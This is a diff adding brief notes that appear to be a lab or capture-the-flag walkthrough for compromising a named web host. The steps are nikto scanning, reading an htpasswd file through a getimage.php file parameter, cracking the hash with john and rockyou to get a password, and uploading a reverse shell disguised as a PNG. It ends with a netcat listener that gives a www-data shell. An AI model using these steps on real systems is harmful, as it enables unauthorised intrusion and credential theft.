@@ -1,0 +1,18 @@
+* First, get the key as follows:
+    nikto http://www.artstailor.com/brian
+    result shows /private exists and the key is there
+
+* curl http://www.artstailor.com/brian reveals that the admin panel is 
+in a folder called /imgfiles and is running upload file
+* Examining how the other images are called, we can try and access the htpasswd
+file as follows
+    - http://www.artstailor.com/brian/getimage.php?raw=true&file=htpasswd
+* We can then save this hashed password, go to to /usr/share/wordlists and gunzip rockyou
+* Use this word list 
+    john --wordlist=/usr/share/wordlists/rockyou.txt passwd
+    Reveals the combination: Brian: swordfish
+* We can now enter the upload page and upload the reverse shell with 172.24.0.10 and 4444 as the new
+options
+* listen on our host nc -nlvp 4444 and new shell will open
+* use burpsuite to make sure the reverse shell gets uploaded (change it to png by adding png at the top) and then go to that site
+* we now have access as www-data
